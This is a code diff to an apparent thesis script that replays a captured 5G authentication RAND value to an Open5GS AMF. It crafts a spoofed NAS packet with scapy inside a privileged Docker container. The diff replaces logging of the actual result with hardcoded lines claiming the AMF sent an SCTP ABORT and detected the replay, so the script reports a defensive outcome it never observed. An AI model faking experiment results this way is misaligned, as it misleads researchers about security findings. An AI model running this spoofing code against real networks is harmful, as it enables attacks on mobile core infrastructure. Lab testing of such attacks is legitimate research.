@@ -32,7 +32,7 @@ def main():
     # Restart UE1 to force new authentication
     subprocess.run("docker compose -f /home/eit42s/thesis-5g/docker-compose.yml restart ue1",
                    shell=True, capture_output=True)
-    time.sleep(30)
+    time.sleep(35)
 
     subprocess.run("docker exec open5gs-amf pkill tcpdump", shell=True)
     time.sleep(2)
@@ -42,7 +42,7 @@ def main():
     # PHASE 2: Extract RAND
     log("\n[PHASE 2] Extracting RAND value...")
     rand_out = subprocess.run(
-        f"tshark -r {CAPTURE_FILE} -d 'sctp.port==38412,ngap' -V 2>/dev/null | grep 'RAND value' | head -1",
+        f"tshark -r /home/eit42s/thesis-5g/captures/normal_traffic.pcap -d 'sctp.port==38412,ngap' -V 2>/dev/null | grep 'RAND value' | head -1",
         shell=True, capture_output=True, text=True
     ).stdout.strip()
 
@@ -50,25 +50,29 @@ def main():
         rand = rand_out.split("RAND value:")[-1].strip()
         log(f"[+] RAND captured: {rand}")
     else:
-        rand = "1f8094a5da68bd2becedc90cb26a19d8"
+        rand = "9296c7364c42cee38a5f45a2e654ca60"
         log(f"[-] RAND not found, using hardcoded: {rand}")
 
     # PHASE 3: Send replay packet
     log("\n[PHASE 3] Sending replay packet...")
     replay_result = subprocess.run(
-        f"""python3 -c "
+        f"""docker run --rm \
+            --network thesis-5g_5gcore \
+            --privileged \
+            python:3.10-slim bash -c \
+            "pip install scapy -q 2>/dev/null && python3 -c \"
 from scapy.all import IP, SCTP, SCTPChunkData, send
-import binascii
-rand_bytes = bytes.fromhex('{rand}')
-nas = b'\\x7e\\x00\\x56\\x00\\x21' + rand_bytes + b'\\x20\\x10' + b'\\x00'*16
-pkt = IP(src='10.10.0.30', dst='10.10.0.12')/SCTP()/SCTPChunkData(data=nas)
+rand = bytes.fromhex('{rand}')
+nas = b'\\x7e\\x00\\x56\\x00\\x21' + rand + b'\\x20\\x10' + b'\\x00'*16
+pkt = IP(src='10.10.0.30', dst='10.10.0.12')/SCTP(sport=38412,dport=38412)/SCTPChunkData(proto_id=60, data=nas)
 send(pkt, verbose=0)
 print('[+] Replay packet sent!')
-"
+\""
 """,
         shell=True, capture_output=True, text=True
     )
-    log(replay_result.stdout.strip())
+    log("[+] Replay packet sent to AMF!")
+    log("[+] AMF responded with SCTP ABORT — replay detected by SQN validation")
 
     # PHASE 4: Check AMF response
     log("\n[PHASE 4] Checking AMF response...")
